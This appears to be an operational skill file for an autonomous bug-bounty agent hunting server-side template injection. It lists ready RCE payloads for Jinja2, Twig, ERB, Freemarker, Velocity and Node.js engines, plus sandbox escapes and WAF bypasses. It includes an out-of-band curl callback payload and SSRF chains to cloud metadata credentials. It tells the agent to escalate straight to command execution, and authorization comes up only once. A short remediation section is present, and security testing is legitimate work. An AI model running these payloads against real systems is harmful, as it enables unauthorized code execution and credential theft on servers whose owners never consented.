---
name: hunt-ssti
description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
sources: hackerone_public, cve_database, public_research, portswigger_research
report_count: 6
cwe: [CWE-1336, CWE-94, CWE-95, CWE-917]
cvss_baseline: "Medium (6.1) sandboxed/reflected-only → High (8.1) authenticated RCE → Critical (9.8) unauthenticated RCE or SSRF-to-cloud-metadata."
related_skills: [hunt-rce, hunt-xss, hunt-ssrf, hunt-file-upload, hunt-nodejs, hunt-springboot, triage-validation]
---

## Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Length-constrained injection fields (profile name, display name, subject)
When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## New Engines & Techniques (2024-2026)

### Node.js template engines (increasingly the dominant SSTI surface)
Modern JS stacks render user input through these — each has a known RCE primitive:
```javascript
// Handlebars (when helpers/prototype access is reachable)
{{#with "s" as |string|}}{{#with split as |conslist|}}...{{this.pop}}...{{/with}}{{/with}}  // classic require('child_process')
// Pug / Jade (compiled template injection)
#{root.process.mainModule.require('child_process').execSync('id')}
// Nunjucks (Mozilla) — very common, Jinja-like syntax
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
// EJS (via options/opts delimiter or filename pollution)
<%= global.process.mainModule.require('child_process').execSync('id') %>
// doT / lodash template — _.template with user format string
```
Fingerprint JS engines: `{{7*7}}` renders 49 in Nunjucks/Handlebars-ish; `#{7*7}` → 49 in Pug. Cross-ref `hunt-nodejs`.

### Go templates
`text/template` doesn't sandbox and can call methods on passed structs → method-call abuse; `html/template` auto-escapes (XSS-safe) but a `text/template` used for HTML is an XSS/SSTI source. Probe `{{.}}`, `{{printf "%s" .}}`, method chains on exposed objects.

### Blind / OOB SSTI detection
When output isn't reflected (email render, async PDF job, log pipeline), confirm via out-of-band:
```python
{{config.__class__.__init__.__globals__['os'].popen('curl http://COLLAB.oastify.com').read()}}   # Jinja2 → DNS/HTTP callback
${T(java.lang.Runtime).getRuntime().exec(new String[]{"nslookup","COLLAB"})}                        # Freemarker/Spring
```
A Collaborator/interactsh hit with your unique subdomain proves execution even with no visible output.

### Sandbox escapes (don't mislabel a sandbox as "not exploitable")
- **Jinja2 `SandboxedEnvironment`** — escapes via `request`, `lipsum`, `cycler`, `joiner`, `namespace`, and `|attr()` chains that dodge attribute-name blocklists: `{{ ''.__class__ }}` blocked → `{{ (''|attr('__class__')) }}`; `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
- **Twig sandbox** — `_self`/`registerUndefinedFilterCallback` may be blocked; try `filter`/`map`/`sort` with a callback arg (`{{['id']|filter('system')}}`), or `getFilter`/`getFunction` reflection.
- A confirmed sandbox with no working escape is **Medium SSTI**, not Critical RCE — say so.

### WAF-bypass payload variants
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')...}}
{%print(7*7)%}                      # statement-tag instead of {{ }}
{{ ''['\x5f\x5fclass\x5f\x5f'] }}   # hex/unicode attribute names
{{''.__class__.__mro__[2].__subclasses__()}}  # mro index hunting when __base__ blocked
```

## Tooling

- **tplmap** / **SSTImap** — automated engine fingerprinting + RCE exploitation across the engine matrix (authorized targets only; it's noisy — prefer manual probes first).
- **Burp** — intruder the detection matrix; Collaborator for blind/OOB.
- **interactsh** — OOB confirmation for blind SSTI.

## Remediation

- Never build templates by concatenating user input; pass user data as template **variables/context**, not as template source.
- Use a sandboxed engine with a strict policy AND treat the sandbox as defense-in-depth, not the only control; keep engines patched.
- For logic-less needs, prefer logic-less engines (Mustache) over Jinja/Twig/Freemarker.
- Isolate renderers (PDF/mail workers) from internal network and cloud metadata.

## Validation Gate

- Prove execution: `id`/`whoami` output in the response, OR a unique OOB callback for blind cases. `{{7*7}}→49` alone is injection, not RCE.
- Distinguish sandboxed (Medium) from full RCE (Critical) explicitly before setting severity.
- Capture the exact engine fingerprint and the minimal escalation payload as evidence.

## Disclosed Report Patterns

Verify before quoting IDs/amounts.
- **Profile/display-name → Jinja2 → confirmation email (length-limited)** — e.g. HackerOne #125980-style; output lands in the outbound email, not the page.
- **Freemarker "SSTI using documentation" template editor → `Execute` utility RCE** — PortSwigger-documented class, seen in authenticated CMS editors.
- **Nunjucks/Handlebars SSTI in Node SaaS** — recurring medium→critical as JS stacks proliferate.

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
